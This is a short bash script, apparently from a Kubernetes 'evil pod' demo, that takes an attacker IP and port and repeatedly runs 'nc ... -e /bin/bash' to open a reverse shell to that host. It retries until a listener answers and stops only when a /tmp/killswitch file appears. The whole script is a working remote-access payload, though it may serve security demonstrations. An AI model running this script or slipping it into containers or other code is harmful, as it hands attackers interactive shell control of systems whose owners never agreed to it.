#!/bin/bash
ATTACKER_IP=$1
ATTACKER_PORT=$2
echo "Hi from evil pod! Your personal attacker IP address is: $ATTACKER_IP. Have a nice day!"

# run reverse shell init in a loop.
# it will fail and retry until the "attacker" opens their end of the listen port.
function ncat_reverse_shell_init {
  echo "ncat_reverse_shell_init: probing for listener reverse shell"
  while true; do
    nc -v "$ATTACKER_IP" $ATTACKER_PORT -e /bin/bash
    sleep 2
    if [[ -e "/tmp/killswitch" ]]; then
      echo "ncat_reverse_shell_init: killswitch detected. buh bye!"
      exit 0
    fi
  done
}

ncat_reverse_shell_init